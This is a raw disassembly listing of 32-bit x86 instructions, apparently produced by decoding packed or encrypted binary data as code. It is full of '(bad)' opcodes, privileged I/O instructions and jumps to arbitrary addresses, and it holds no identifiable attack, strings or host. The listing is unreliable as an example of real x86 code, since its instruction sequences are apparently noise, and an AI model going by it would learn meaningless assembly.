  421c49:	add    eax,0x2f4644ec
  421c4e:	in     al,dx
  421c4f:	bound  eax,QWORD PTR [esi-0x36]
  421c52:	daa    
  421c53:	popa   
  421c54:	setp   BYTE PTR [edi+0x2c]
  421c58:	inc    esi
  421c59:	ins    BYTE PTR es:[edi],dx
  421c5a:	scas   eax,DWORD PTR es:[edi]
  421c5b:	ret    
  421c5c:	fs test edx,esp
  421c5f:	out    dx,eax
  421c60:	popf   
  421c61:	repz jb 0x421c7a
  421c64:	sbb    eax,0x29511544
  421c69:	inc    esp
  421c6a:	in     al,dx
  421c6b:	or     DWORD PTR [ebp-0x4],ebp
  421c6e:	xor    bl,BYTE PTR [edi+0x40]
  421c71:	inc    edx
  421c72:	ja     0x421c44
  421c74:	sbb    edx,esp
  421c76:	push   edx
  421c77:	jns    0x421cd3
  421c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c7a:	aad    0x8d
  421c7c:	stos   DWORD PTR es:[edi],eax
  421c7d:	es inc edi
  421c7f:	jae    0x421c9a
  421c81:	inc    edx
  421c82:	inc    ecx
  421c83:	jmp    0x68c43b52
  421c88:	and    eax,0xc962a759
  421c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c8e:	xor    eax,0x6182fe7a
  421c93:	jp     0x421c7b
  421c95:	gs out 0x97,al
  421c98:	int    0x24
  421c9a:	add    eax,0x90bba98f
  421c9f:	mov    esi,0x1935f105
  421ca4:	pusha  
  421ca5:	inc    eax
  421ca6:	mov    esi,ecx
  421ca8:	ins    DWORD PTR es:[edi],dx
  421ca9:	scas   al,BYTE PTR es:[edi]
  421caa:	enter  0x485e,0x74
  421cae:	rcl    BYTE PTR [ebx],cl
  421cb0:	sbb    eax,0xe0cc8eb0
  421cb5:	inc    ecx
  421cb6:	or     dl,BYTE PTR [eax-0x2ea76d14]
  421cbc:	fidiv  DWORD PTR [ebx]
  421cbe:	dec    edx
  421cbf:	pop    eax
  421cc0:	out    0x0,eax
	...
  421d32:	add    BYTE PTR [eax],al
  421d34:	out    0x1e,eax
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	int    0xc9
  421d42:	ret    0x9eb0
  421d45:	imul   eax,DWORD PTR [ecx],0xf500
  421d4b:	add    ch,ch
  421d4d:	or     al,0xb4
  421d4f:	cdq    
  421d50:	loopne 0x421dad
  421d52:	and    ecx,esp
  421d54:	lahf   
  421d55:	add    al,0x84
  421d57:	push   cs
  421d58:	push   eax
  421d59:	pop    esi
  421d5a:	hlt    
  421d5b:	shl    BYTE PTR [ebx+0x775a49c4],cl
  421d61:	leave  
  421d62:	inc    esi
  421d63:	rol    DWORD PTR [eax+eax*1],cl
  421d66:	push   ss
  421d67:	inc    ebx
  421d68:	add    esi,DWORD PTR [eax]
  421d6a:	add    ebx,esi
  421d6c:	jnp    0x421d22
  421d6e:	retf   
  421d6f:	lods   eax,DWORD PTR ds:[esi]
  421d70:	(bad)  
  421d71:	out    dx,al
  421d72:	test   DWORD PTR [edi+0x5e],edi
  421d75:	out    0x37,al
  421d77:	mov    ch,0x83
  421d79:	fcom   QWORD PTR fs:[ecx-0x10cce907]
  421d80:	inc    edi
  421d81:	loope  0x421ddc
  421d83:	jle    0x421df8
  421d85:	std    
  421d86:	sub    DWORD PTR [ecx+0x211a8274],esp
  421d8c:	mov    esp,0xf2bdc820
  421d91:	xor    DWORD PTR [ebp+0x74309f12],0x11
  421d98:	in     eax,0xb1
  421d9a:	pop    esp
  421d9b:	xchg   BYTE PTR [ebx+0x5a],bl
  421d9e:	push   ds
  421d9f:	repz cli 
  421da1:	fs loop 0x421d62
  421da4:	in     al,0x18
  421da6:	out    dx,al
  421da7:	aaa    
  421da8:	test   ch,bh
  421daa:	pop    edi
  421dab:	imul   edx,DWORD PTR [edx-0x3a],0xffffffd0
  421daf:	jg     0x421e0d
  421db1:	xchg   ecx,eax
  421db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421db3:	ins    BYTE PTR es:[edi],dx
  421db4:	sub    BYTE PTR [edi],bl
  421db6:	jp     0x421d3f
  421db8:	jl     0x421da3
  421dba:	ficomp DWORD PTR [ebx+eiz*1-0x6c820979]
  421dc1:	add    al,ah
  421dc3:	(bad)  
  421dc4:	mov    esi,0x7500c3ed
  421dc9:	mov    ah,0x70
  421dcb:	fucomp st(6)
  421dcd:	and    ah,cl
  421dcf:	add    eax,0x376da602
  421dd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dd5:	or     dl,BYTE PTR [esi-0x48]
  421dd8:	shl    esp,0x73
  421ddb:	xchg   ebp,eax
  421ddc:	mov    edi,0xfd6da050
  421de1:	xchg   ebp,eax
  421de2:	xchg   ebp,eax
  421de3:	repz mov bl,0xa3
  421de6:	push   ebx
  421de7:	or     DWORD PTR [bp+si],esp
  421dea:	and    BYTE PTR [eax+eax*8-0x2e8cfe09],dl
  421df1:	cmp    al,0xdb
  421df3:	loop   0x421da6
  421df5:	sub    eax,0x93994429
  421dfa:	sub    bh,ah
  421dfc:	jo     0x421d8f
  421dfe:	dec    eax
  421dff:	nop
  421e00:	pop    ds
  421e01:	add    DWORD PTR [edi-0x7265c072],esi
  421e07:	xor    cl,0xf3
  421e0a:	xor    ebp,edx
  421e0c:	dec    eax
  421e0d:	mov    ds:0x6cbe66ca,al
  421e12:	outs   dx,BYTE PTR ds:[esi]
  421e13:	outs   dx,DWORD PTR ds:[esi]
  421e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e15:	and    BYTE PTR [edi-0x11],cl
  421e18:	ffree  st(3)
  421e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e1b:	ret    
  421e1c:	push   ds
  421e1d:	fnstenv [ecx]
  421e1f:	mov    ch,0x4e
  421e21:	int    0xbe
  421e23:	pop    ss
  421e24:	fldcw  WORD PTR [edi+0x30d654e1]
  421e2a:	je     0x421e99
  421e2c:	mov    bl,0xbc
  421e2e:	adc    al,0xae
  421e30:	mov    bl,0xcc
  421e32:	jo     0x421dce
  421e34:	dec    ebp
  421e35:	(bad)  
  421e36:	xor    al,0xd7
  421e38:	cli    
  421e39:	out    0xd6,al
  421e3b:	inc    ebp
  421e3c:	sub    dl,ah
  421e3e:	dec    ecx
  421e3f:	mov    cs,ebp
	...
  421eb1:	add    BYTE PTR [eax],al
  421eb3:	add    BYTE PTR [eax],ah
  421eb5:	xchg   edi,eax
  421eb6:	inc    edx
  421eb7:	shl    edi,cl
  421eb9:	xlat   BYTE PTR ds:[ebx]
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421e5b
  421ec1:	dec    ebp
  421ec2:	jl     0x421eda
  421ec4:	xchg   ebx,eax
  421ec5:	push   0x1
  421ec7:	add    ch,dh
  421ec9:	add    BYTE PTR [eax],al
  421ecb:	add    BYTE PTR [eax+0x681bf404],ah
  421ed1:	mov    ch,0xc5
  421ed3:	dec    ebx
  421ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ed5:	adc    BYTE PTR [ecx],bh
  421ed7:	adc    al,0x86
  421ed9:	ins    DWORD PTR es:[edi],dx
  421eda:	or     eax,0x7108a87b
  421edf:	mov    DWORD PTR [ecx],0x3ca6095c
  421ee5:	xchg   ebx,eax
  421ee6:	loope  0x421f50
  421ee8:	call   0xa255:0xe0c8eda1
  421eef:	les    ebx,FWORD PTR [ecx]
  421ef1:	daa    
  421ef2:	fdivp  st(6),st
  421ef4:	out    0xbf,al
  421ef6:	cmp    esp,esi
  421ef8:	arpl   cx,ax
  421efa:	lods   al,BYTE PTR ds:[esi]
  421efb:	(bad)  
  421efc:	ror    BYTE PTR [ecx-0x2ed5cbfe],0x1c
  421f03:	leave  
  421f04:	inc    eax
  421f05:	pop    ecx
  421f06:	sub    esp,ebp
  421f08:	ins    BYTE PTR es:[edi],dx
  421f09:	shl    BYTE PTR [eax],1
  421f0b:	clc    
  421f0c:	shr    BYTE PTR [ecx-0x3fd2ba8a],1
  421f12:	xchg   DWORD PTR [edi],esi
  421f14:	push   esi
  421f15:	cmc    
  421f16:	sub    BYTE PTR [ebp+0x46],dl
  421f19:	loop   0x421f2e
  421f1b:	cs call 0xa05888ff
  421f21:	mov    eax,0x5d618bb8
  421f26:	mov    eax,ds:0x60e7f00a
  421f2b:	mov    eax,ds:0x2024ed65
  421f30:	mov    ah,0xf1
  421f32:	imul   ecx,DWORD PTR [edx+0x3aa2af63],0xfffffff9
  421f39:	adc    BYTE PTR [ecx+0x61dee641],ch
  421f3f:	das    
  421f40:	xchg   ebx,eax
  421f41:	iret   
  421f42:	push   0xb972180f
  421f47:	sti    
  421f48:	xor    edi,ebx
  421f4a:	adc    ecx,ebp
  421f4c:	dec    ebx
  421f4d:	(bad)  
  421f4e:	arpl   bx,bp
  421f50:	push   ecx
  421f51:	imul   esi,DWORD PTR ds:0x27e24243,0x3
  421f58:	sahf   
  421f59:	dec    eax
  421f5a:	int    0x22
  421f5c:	shr    BYTE PTR [esi],0x36
  421f5f:	int    0x21
  421f61:	repnz stos BYTE PTR es:[edi],al
  421f63:	mov    edi,0x4b39e1aa
  421f68:	dec    ebx
  421f69:	mov    bl,0x1b
  421f6b:	xor    eax,0xfe0c7720
  421f70:	cdq    
  421f71:	mov    edx,ebp
  421f73:	jecxz  0x421f8a
  421f75:	daa    
  421f76:	xor    ecx,DWORD PTR [eax]
  421f78:	cld    
  421f79:	into   
  421f7a:	call   0xa402:0x7e3b81f7
  421f81:	dec    esi
  421f82:	mov    al,ds:0xaf5aff6a
  421f87:	not    BYTE PTR [ecx+0x25e3fe6b]
  421f8d:	jne    0x421feb
  421f8f:	test   BYTE PTR [eax-0x62250759],ah
  421f95:	mov    dl,0xe2
  421f97:	adc    edx,DWORD PTR [edx-0x38]
  421f9a:	pushf  
  421f9b:	fucomi st,st(0)
  421f9d:	lods   eax,DWORD PTR ds:[esi]
  421f9e:	test   BYTE PTR [ebx+ecx*1-0x4b],bl
  421fa2:	enter  0x482d,0xc0
  421fa6:	jecxz  0x421f4d
  421fa8:	mov    esp,0xf2bea215
  421fad:	daa    
  421fae:	push   es
  421faf:	inc    ebp
  421fb0:	not    dl
  421fb2:	add    BYTE PTR ds:0xe4e6d610,0x46
  421fb9:	pushf  
  421fba:	retf   0x8ed4
  421fbd:	imul   ebx,ebx,0x124b
	...
  422033:	add    BYTE PTR [edi-0x243925a2],bl
  422039:	(bad)  
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0x999d29f1
  422044:	mov    BYTE PTR [ebx+0x1],ch
  422047:	add    ch,dh
  422049:	add    BYTE PTR [eax],al
  42204b:	add    BYTE PTR [eax+0x125a954d],al
  422051:	iret   
  422052:	adc    DWORD PTR [eax+0x14f5770a],edi
  422058:	or     DWORD PTR [edi-0x30f597db],ecx
  42205e:	xchg   esp,eax
  42205f:	mov    dh,0x6e
  422061:	pop    eax
  422062:	push   0x7fe5a5f8
  422067:	jmp    0x5901afc2
  42206c:	push   esi
  42206d:	xor    eax,0x5de813bb
  422072:	pop    eax
  422073:	or     eax,0xf512b698
  422078:	adc    al,0x74
  42207a:	loope  0x422057
  42207c:	test   al,0x44
  42207e:	mov    ds:0xa52e3954,al
  422083:	(bad)  
  422084:	push   esp
  422085:	ins    BYTE PTR es:[edi],dx
  422086:	(bad)  
  422087:	mov    dh,0x4c
  422089:	retf   
  42208a:	dec    ebx
  42208b:	fdivr  QWORD PTR [esi-0x36]
  42208e:	or     DWORD PTR [ecx],esp
  422090:	jae    0x42209a
  422092:	pop    ds
  422093:	retf   
  422094:	push   0x41
  422096:	leavew 
  422098:	cmp    BYTE PTR [ebx-0x799e135e],ch
  42209e:	jns    0x422037
  4220a0:	sbb    esi,DWORD PTR [edx]
  4220a2:	pop    esi
  4220a3:	(bad)
  4220a6:	sbb    ebx,DWORD PTR [eax+eax*8-0x124907e0]
  4220ad:	mov    dl,BYTE PTR [ebx+0x673603ab]
  4220b3:	popf   
  4220b4:	cld    
  4220b5:	ja     0x4220fc
  4220b7:	shr    dh,1
  4220b9:	mov    bh,0x52
  4220bb:	inc    eax
  4220bc:	and    al,0x23
  4220be:	int3   
  4220bf:	cmp    al,0x5e
  4220c1:	and    eax,0x125833c0
  4220c6:	jge    0x42208d
  4220c8:	xchg   esp,eax
  4220c9:	jno    0x4220ae
  4220cb:	stos   DWORD PTR es:[edi],eax
  4220cc:	into   
  4220cd:	dec    esp
  4220ce:	mov    ds:0xc7cdb382,al
  4220d3:	leave  
  4220d4:	fisub  DWORD PTR [esi-0x60]
  4220d7:	es ret 
  4220d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220da:	imul   esp,ebx,0x2fa7a1dc
  4220e0:	adc    DWORD PTR [eax+0x52fd7cc9],edi
  4220e6:	test   al,0xd2
  4220e8:	xor    DWORD PTR [eax+0x2c7a76f9],0xd98d8c97
  4220f2:	push   ebx
  4220f3:	jnp    0x422132
  4220f5:	sbb    DWORD PTR [ebp-0x56],ebx
  4220f8:	pop    ss
  4220f9:	sub    DWORD PTR [ecx+0x5f],eax
  4220fc:	sub    BYTE PTR [ecx-0x22],bh
  4220ff:	ret    0xf35c
  422102:	jbe    0x422093
  422104:	push   esi
  422105:	xor    DWORD PTR [esi+edx*8+0x305c9cc9],0xd09caff5
  422110:	(bad)  
  422111:	stos   BYTE PTR es:[edi],al
  422112:	aas    
  422113:	outs   dx,BYTE PTR ds:[esi]
  422114:	in     al,0x78
  422116:	fs mov dl,0xa6
  422119:	ss fs sbb ecx,ebp
  42211d:	mov    cl,0x89
  42211f:	push   edi
  422120:	aaa    
  422121:	pop    es
  422122:	jl     0x4220c6
  422124:	sub    edi,edi
  422126:	sub    al,0x44
  422128:	cdq    
  422129:	shr    BYTE PTR [eax-0x2f],0x12
  42212d:	shl    edi,0xfe
  422130:	icebp  
  422131:	clc    
  422132:	stos   BYTE PTR es:[edi],al
  422133:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422134:	in     eax,0x89
  422136:	sbb    DWORD PTR [ebp-0xf],eax
  422139:	pop    esp
  42213a:	push   eax
  42213b:	or     DWORD PTR [eax+0x9],esi
  42213e:	cmp    DWORD PTR [ecx+0x4a],eax
	...
  4221b1:	add    BYTE PTR [eax],al
  4221b3:	add    BYTE PTR [esi-0x700870e1],bl
  4221b9:	idiv   esi
  4221bb:	jg     0x4221f8
  4221bd:	data16 daa 
  4221bf:	aad    0x7f
  4221c1:	fdiv   QWORD PTR [ecx+0x49]
  4221c4:	jge    0x422232
  4221c6:	add    DWORD PTR [eax],eax
  4221c8:	cmc    
  4221c9:	add    BYTE PTR [eax],al
  4221cb:	add    BYTE PTR [ebp-0x27],cl
  4221ce:	popa   
  4221cf:	retf   0xb258
  4221d2:	iret   
  4221d3:	xor    eax,esp
  4221d5:	sti    
  4221d6:	cmp    al,cl
  4221d8:	(bad)  
  4221d9:	jns    0x4221c4
  4221db:	dec    eax
  4221dc:	outs   dx,DWORD PTR ds:[esi]
  4221dd:	push   0x11
  4221df:	jnp    0x4221eb
  4221e1:	xlat   BYTE PTR ds:[ebx]
  4221e2:	test   BYTE PTR [esi],ch
  4221e4:	aad    0xc5
  4221e6:	adc    al,0x77
  4221e8:	push   ds
  4221e9:	or     eax,0xa949af77
  4221ee:	loop   0x422220
  4221f0:	cdq    
  4221f1:	add    edx,DWORD PTR [ebp+0x53]
  4221f4:	xchg   esi,eax
  4221f5:	push   ecx
  4221f6:	push   ebx
  4221f7:	push   edi
  4221f8:	mov    WORD PTR [ebx-0x421cb3a6],gs
  4221fe:	mov    BYTE PTR [ebx-0x15],al
  422201:	jle    0x42225b
  422203:	imul   ebx,esi,0x94b7c32
  422209:	cld    
  42220a:	dec    esp
  42220b:	dec    ecx
  42220c:	(bad)  
  42220d:	(bad)  
  42220e:	fld    QWORD PTR [ebp+0x46cad91a]
  422214:	jmp    0x29aab48e
  422219:	ss push esp
  42221b:	sub    DWORD PTR [eax+0x326b6fe1],ebx
  422221:	sub    BYTE PTR [edx],bh
  422223:	int3   
  422224:	add    eax,0x66810853
  422229:	xor    cl,cl
  42222b:	dec    ebx
  42222c:	(bad)  
  42222d:	push   ebp
  42222e:	cmp    eax,0xd7e71548
  422233:	mov    ah,0x26
  422235:	sbb    DWORD PTR [ecx],esp
  422237:	je     0x422212
  422239:	iret   
  42223a:	out    0x28,eax
  42223c:	in     eax,dx
  42223d:	shr    BYTE PTR [ebp+edi*2+0xc],1
  422241:	xchg   ebx,eax
  422242:	retf   
  422243:	adc    bl,BYTE PTR [ebp-0x25]
  422246:	test   al,0xc7
  422248:	fwait
  422249:	bound  ebp,QWORD PTR [edi]
  42224b:	or     al,0x43
  42224d:	push   ecx
  42224e:	loope  0x422257
  422250:	scas   eax,DWORD PTR es:[edi]
  422251:	pop    eax
  422252:	inc    esi
  422253:	faddp  st(6),st
  422255:	cli    
  422256:	repz aam 0x4f
  422259:	cmp    ah,bh
  42225b:	lock fistp WORD PTR [ebp+ebx*1-0x5d9191e]
  422263:	cmc    
  422264:	xor    DWORD PTR [ebp+0x7b],esp
  422267:	inc    edx
  422268:	xchg   edx,eax
  422269:	xchg   DWORD PTR [edi],esp
  42226b:	sbb    BYTE PTR [ebx+0x64],dh
  42226e:	pop    edx
  42226f:	(bad)  
  422270:	cmc    
  422271:	dec    ebx
  422272:	add    eax,0x812187d1
  422277:	jne    0x42225c
  422279:	sbb    DWORD PTR ds:[esi],esp
  42227c:	loope  0x422296
  42227e:	jle    0x4222d4
  422280:	(bad)  
  422282:	out    dx,eax
  422283:	jo     0x422291
  422285:	mov    al,ds:0x8951ce08
  42228a:	arpl   WORD PTR [ebp+0x668db75b],si
  422290:	inc    ecx
  422291:	mov    BYTE PTR ss:[ebx-0xc],0x9d
  422296:	adc    al,0x42
  422298:	das    
  422299:	js     0x422308
  42229b:	push   ss
  42229c:	add    ecx,DWORD PTR [edi-0x113ec127]
  4222a2:	call   0x79567d99
  4222a7:	cmp    BYTE PTR [ecx],dl
  4222a9:	jne    0x4222b3
  4222ab:	cmp    DWORD PTR [eax+0x6e],0x6e
  4222af:	call   DWORD PTR [eax+0x2f313dd3]
  4222b5:	xlat   BYTE PTR ds:[ebx]
  4222b6:	push   ss
  4222b7:	add    esi,DWORD PTR [ebx+0x7f]
  4222ba:	bts    DWORD PTR [esi],ebx
  4222bd:	fdiv   DWORD PTR [ecx]
  4222bf:	scas   al,BYTE PTR es:[edi]
  4222c0:	call   0x4222c5
	...
  422331:	add    BYTE PTR [eax],al
  422333:	add    dh,bh
  422335:	(bad)  
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	es jo  0x422317
  422343:	mov    ?,WORD PTR [edx+0x6d]
  422346:	add    DWORD PTR [eax],eax
  422348:	cmc    
  422349:	add    BYTE PTR [eax],al
  42234b:	add    BYTE PTR [ebx],ah
  42234d:	push   edi
  42234e:	jecxz  0x4223c5
  422350:	and    DWORD PTR [ebp+edi*2-0x74],edx
  422354:	out    0xbf,eax
  422356:	pop    ds
  422357:	sbb    edi,DWORD PTR [esp+edx*1-0x3cbbff20]
  42235e:	rcl    DWORD PTR [ecx+0x3],0x80
  422362:	cwde   
  422363:	fidivr WORD PTR [ebp+0x4b]
  422366:	leave  
  422367:	push   0xbe3177d2
  42236c:	xchg   ebp,eax
  42236d:	aaa    
  42236e:	lods   al,BYTE PTR ds:[esi]
  42236f:	std    
  422370:	or     ebp,0xd0136db9
  422376:	ja     0x4223d7
  422378:	inc    ebp
  422379:	(bad)  
  42237a:	jecxz  0x4223c5
  42237c:	dec    eax
  42237d:	stos   DWORD PTR es:[edi],eax
  42237e:	repnz cmp DWORD PTR ds:[edx],edi
  422382:	dec    esp
  422383:	pop    ebx
  422384:	push   ds
  422385:	das    
  422386:	fild   WORD PTR [edx+eiz*2+0x10154751]
  42238d:	jae    0x422389
  42238f:	out    0xdd,eax
  422391:	shl    DWORD PTR [edi],cl
  422393:	int    0xe6
  422395:	retf   0x46b5
  422398:	test   eax,0x21c4590e
  42239d:	or     al,BYTE PTR [ebx]
  42239f:	fneni(8087 only) 
  4223a1:	fnsave [ebx+0x14]
  4223a4:	jle    0x42241e
  4223a6:	dec    ecx
  4223a7:	retf   0x1c68
  4223aa:	fwait
  4223ab:	mov    esi,0x78dfc1ca
  4223b0:	sar    DWORD PTR [edx+0x7e398e08],0x9b
  4223b7:	ins    DWORD PTR es:[edi],dx
  4223b8:	jne    0x422392
  4223ba:	sub    al,0xce
  4223bc:	adc    eax,0x4ca998f2
  4223c1:	lock push edi
  4223c3:	pushf  
  4223c4:	mov    dl,0x39
  4223c6:	fcomp  DWORD PTR [ecx]
  4223c8:	push   eax
  4223c9:	push   cs
  4223ca:	jb     0x42238d
  4223cc:	outs   dx,DWORD PTR ds:[esi]
  4223cd:	sub    BYTE PTR [edi],ah
  4223cf:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223d1:	inc    esp
  4223d2:	or     DWORD PTR [ebp+edx*8+0x5eb1b393],edx
  4223d9:	jecxz  0x4223f3
  4223db:	cmp    eax,0x5b5a41db
  4223e0:	pop    eax
  4223e1:	gs xor eax,0xa7880fde
  4223e7:	in     al,dx
  4223e8:	sar    cl,0xb0
  4223eb:	and    DWORD PTR [edx-0x52],0xffffff98
  4223ef:	jge    0x4223b0
  4223f1:	mov    al,ds:0xea54c4eb
  4223f6:	in     al,0x77
  4223f8:	push   0xffffffaf
  4223fa:	mov    bl,0xae
  4223fc:	call   0xe48b:0xc5c3b111
  422403:	dec    ebp
  422404:	pop    edi
  422405:	inc    ecx
  422406:	xor    eax,0x19fc18d5
  42240b:	pop    ds
  42240c:	je     0x4223a4
  42240e:	(bad)  
  42240f:	retf   
  422410:	(bad)  
  422411:	mov    bh,0xb0
  422413:	cmp    ch,dh
  422415:	ds pop ebp
  422417:	mov    ecx,0x56d41189
  42241c:	xor    al,0x83
  42241e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42241f:	mov    al,ds:0xf8d5037b
  422424:	(bad)  
  422425:	int    0xe1
  422427:	loop   0x422481
  422429:	adc    al,0xcb
  42242b:	sub    DWORD PTR ds:0xe641456b,esi
  422431:	loope  0x4223e3
  422433:	adc    edx,DWORD PTR [eax+0x75399c06]
  422439:	push   esi
  42243a:	dec    edi
  42243b:	pop    es
  42243c:	and    al,0xce
  42243e:	lock mov edi,0x3b
	...
  4224b4:	(bad)  
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0x9aed9f7c
  4224c2:	jge    0x42249d
  4224c4:	outs   dx,BYTE PTR ds:[si]
  4224c6:	add    DWORD PTR [eax],eax
  4224c8:	cmc    
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    bl,ah
  4224cd:	push   0xa73a0400
  4224d2:	dec    eax
  4224d3:	icebp  
  4224d4:	repz pushf 
  4224d6:	mov    dh,0xef
  4224d8:	loop   0x422537
  4224da:	ins    DWORD PTR es:[edi],dx
  4224db:	xor    BYTE PTR [eax],ah
  4224dd:	pop    ebx
  4224de:	xchg   ebp,eax
  4224df:	cdq    
  4224e0:	xchg   ecx,eax
  4224e1:	add    BYTE PTR [ebp+0x75],bl
  4224e4:	stos   WORD PTR es:[edi],ax
  4224e6:	icebp  
  4224e7:	jo     0x4224a1
  4224e9:	cmp    DWORD PTR [ecx],0x74
  4224ec:	pop    ss
  4224ed:	pop    ebp
  4224ef:	cmp    dh,BYTE PTR [ebp-0x40939f3]
  4224f5:	jecxz  0x4224a8
  4224f7:	ds inc ebx
  4224f9:	adc    al,0x37
  4224fb:	outs   dx,BYTE PTR ds:[esi]
  4224fc:	push   cs
  4224fd:	out    0x69,al
  4224ff:	in     al,dx
  422500:	lahf   
  422501:	fwait
  422502:	je     0x42251d
  422504:	int3   
  422505:	adc    BYTE PTR [ebp-0x4d0ae4a8],ch
  42250b:	sahf   
  42250c:	add    eax,0x6da66457
  422511:	shl    eax,1
  422513:	pop    ss
  422514:	in     eax,dx
  422515:	imul   ebp,DWORD PTR [eax-0x396443c5],0xffffff95
  42251c:	stos   BYTE PTR es:[edi],al
  42251d:	inc    eax
  42251e:	xor    BYTE PTR [esi-0x9],bh
  422521:	add    eax,0x51b4b9c9
  422526:	adc    eax,0x8ee7459e
  42252b:	cdq    
  42252c:	jecxz  0x422551
  42252e:	inc    ecx
  42252f:	sbb    BYTE PTR [ebp+ebx*8-0x19],0xc0
  422534:	sbb    bh,BYTE PTR [ecx+0x3]
  422537:	sahf   
  422538:	(bad)  
  42253a:	inc    esp
  42253b:	stos   BYTE PTR es:[edi],al
  42253c:	ds sbb eax,0xdcdd21fa
  422542:	add    edx,DWORD PTR [esi]
  422544:	and    eax,DWORD PTR [eax+0x79]
  422547:	imul   ecx,DWORD PTR [ecx],0xffffffa6
  42254a:	in     eax,dx
  42254b:	mov    bl,0x9
  42254d:	(bad)  
  42254e:	cmp    BYTE PTR [ebx+0x41060594],ch
  422554:	xchg   esp,eax
  422555:	fldcw  WORD PTR [ecx]
  422557:	mov    ebp,0xf9b78c5f
  42255c:	cld    
  42255d:	gs retf 
  42255f:	sub    al,0x8b
  422561:	shl    DWORD PTR [ecx-0x6c],0x39
  422565:	and    al,0x29
  422567:	and    esp,DWORD PTR [edi+ebp*2+0x7]
  42256b:	adc    DWORD PTR [ecx-0x3d],esp
  42256e:	mov    ah,0x46
  422570:	cmp    esp,ebx
  422572:	adc    dl,bl
  422574:	mov    WORD PTR [edi-0x7c],?
  422577:	sbb    bh,ch
  422579:	jl     0x422565
  42257b:	(bad)  
  42257d:	jl     0x42259e
  42257f:	mov    al,ds:0x53f3b2ba
  422584:	in     al,0x16
  422586:	cs int 0x20
  422589:	lea    ebp,[eax]
  42258b:	pop    edx
  42258c:	pop    edi
  42258d:	or     edi,eax
  42258f:	pop    edx
  422590:	stc    
  422591:	das    
  422592:	dec    ecx
  422593:	jge    0x4225c1
  422595:	jb     0x422606
  422597:	ins    DWORD PTR es:[edi],dx
  422598:	mov    WORD PTR [ecx],es
  42259a:	ss (bad) 
  42259d:	int    0x16
  42259f:	imul   eax,DWORD PTR [edi+ebp*8],0xb4598ee9
  4225a6:	and    DWORD PTR [ebx+0x68d39863],0xffffffa9
  4225ad:	pop    ebx
  4225ae:	mov    ebx,0x18492b4d
  4225b3:	out    dx,al
  4225b4:	xchg   edx,eax
  4225b5:	(bad)  
  4225b6:	call   0xb63c:0xa133ce03
  4225bd:	mov    dl,0xf9
  4225bf:	jmp    0x4225f9
	...
  422631:	add    BYTE PTR [eax],al
  422633:	add    BYTE PTR [ebx-0x105512d4],ch
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	and    dh,BYTE PTR [edx]
  422642:	test   BYTE PTR [edx],cl
  422644:	pop    esp
  422645:	outs   dx,DWORD PTR ds:[esi]
  422646:	add    DWORD PTR [eax],eax
  422648:	cmc    
  422649:	add    BYTE PTR [eax],al
  42264b:	add    al,cl
  42264d:	xor    al,0x71
  42264f:	inc    edi
  422650:	je     0x4226c1
  422652:	aad    0x2c
  422654:	mov    esi,0x8205479a
  422659:	inc    eax
  42265a:	jp     0x422649
  42265c:	mov    ah,BYTE PTR [ebx]
  42265e:	fiadd  DWORD PTR [edx+ebp*2+0x508ef552]
  422665:	sar    DWORD PTR [esi],0x22
  422668:	mov    ebx,0xb7db8bdf
  42266d:	push   ss
  42266e:	stos   BYTE PTR es:[edi],al
  42266f:	adc    BYTE PTR [esp+esi*1+0x7b561188],0x82
  422677:	imul   edi,edx,0x741c7b8c
  42267d:	lock mov WORD PTR [esi+0x7a],?
  422681:	xchg   DWORD PTR [ebx],esi
  422683:	mov    eax,ds:0x5f7bff6f
  422688:	inc    ebp
  422689:	stos   DWORD PTR es:[edi],eax
  42268a:	mov    dh,bl
  42268c:	jecxz  0x422633
  42268e:	add    ebp,DWORD PTR [ecx]
  422690:	pop    ds
  422691:	xchg   ebp,eax
  422692:	inc    ecx
  422693:	inc    ebp
  422694:	adc    DWORD PTR [esi+0x5e],edi
  422697:	xchg   DWORD PTR [esi+0x9],ebp
  42269a:	inc    ebp
  42269b:	and    eax,0x3b590e98
  4226a0:	inc    ecx
  4226a1:	or     DWORD PTR [ebx-0x40],ebx
  4226a4:	xchg   ebx,eax
  4226a5:	mov    ah,0xbd
  4226a7:	push   esp
  4226a8:	and    eax,0x3fa4fec2
  4226ad:	sub    bh,al
  4226af:	mov    dh,0x16
  4226b1:	lods   al,BYTE PTR ds:[esi]
  4226b2:	jmp    0x9682be72
  4226b7:	dec    eax
  4226b8:	cmp    esi,DWORD PTR [ebp-0x6054aa44]
  4226be:	pop    edx
  4226bf:	gs popa 
  4226c1:	xor    ebp,DWORD PTR [ebp-0x10]
  4226c4:	fdiv   DWORD PTR [ecx+esi*8+0x77]
  4226c8:	dec    DWORD PTR [esi]
  4226ca:	jo     0x42264c
  4226cc:	dec    esp
  4226cd:	mov    edx,0x5cf39338
  4226d2:	outs   dx,BYTE PTR ds:[esi]
  4226d3:	sbb    DWORD PTR [edx+0x3045b0c],0xffffff98
  4226da:	push   ebx
  4226db:	cmp    dh,dl
  4226dd:	or     DWORD PTR [eax-0x6b6a7068],esp
